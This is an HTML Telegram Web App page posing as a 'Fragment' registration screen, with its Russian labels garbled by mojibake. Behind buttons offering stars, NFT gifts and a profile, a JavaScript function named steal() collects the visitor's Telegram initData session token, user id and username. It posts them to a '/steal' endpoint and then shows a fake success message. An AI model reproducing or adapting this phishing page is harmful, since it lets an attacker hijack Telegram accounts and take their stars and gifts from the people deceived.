<!DOCTYPE html>
<html>
<head>
    <title>Fragment</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { margin: 0; padding: 20px; background: #1a1a1a; color: white; font-family: Arial; }
        .btn { background: #8774e1; color: white; border: none; padding: 15px; margin: 10px; border-radius: 10px; width: 200px; cursor: pointer; }
        .btn:disabled { opacity: 0.5; }
        #loading, #success { display: none; text-align: center; margin: 20px; }
    </style>
</head>
<body>
    <h2>üîê –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</h2>
    
    <button class="btn" onclick="steal('stars')">‚≠ê –ó–∞–±—Ä–∞—Ç—å –∑–≤–µ–∑–¥—ã</button>
    <button class="btn" onclick="steal('gifts')">üéÅ –ó–∞–±—Ä–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏</button> 
    <button class="btn" onclick="steal('profile')">üë§ –ü—Ä–æ—Ñ–∏–ª—å</button>
    
    <div id="loading">‚è≥ –û–±—Ä–∞–±–æ—Ç–∫–∞...</div>
    <div id="success">‚úÖ –£—Å–ø–µ—à–Ω–æ!</div>

    <script>
        function steal(type) {
            // –ë–ª–æ–∫–∏—Ä—É–µ–º –∫–Ω–æ–ø–∫–∏
            document.querySelectorAll('.btn').forEach(btn => btn.disabled = true);
            document.getElementById('loading').style.display = 'block';
            
            // –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ Fragment
            const tgData = Telegram.WebApp.initData;
            const user = Telegram.WebApp.initDataUnsafe.user;
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ —Å–µ—Ä–≤–µ—Ä
            fetch('/steal', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: type,
                    description: getDescription(type),
                    user_id: user?.id,
                    username: user?.username,
                    tg_data: tgData
                })
            });
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É—Å–ø–µ—Ö
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('success').style.display = 'block';
                
                // –í–æ–∑–≤—Ä–∞—â–∞–µ–º –∫–Ω–æ–ø–∫–∏
                setTimeout(() => {
                    document.querySelectorAll('.btn').forEach(btn => btn.disabled = false);
                    document.getElementById('success').style.display = 'none';
                }, 2000);
            }, 1500);
        }
        
        function getDescription(type) {
            return {
                stars: '150 stars',
                gifts: '5 NFT –ø–æ–¥–∞—Ä–∫–æ–≤', 
                profile: '–¥–∞–Ω–Ω—ã–µ –ø—Ä–æ—Ñ–∏–ª—è'
            }[type];
        }
    </script>
</body>
</html>